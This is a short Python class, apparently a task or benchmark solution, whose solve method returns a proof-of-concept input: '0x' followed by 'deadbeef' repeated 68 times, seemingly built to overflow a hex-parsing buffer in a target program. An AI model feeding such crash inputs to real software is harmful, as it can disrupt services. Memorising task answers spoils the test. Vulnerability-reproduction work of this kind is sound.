class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"0x" + b"deadbeef" * 68 + b"f"
        return poc
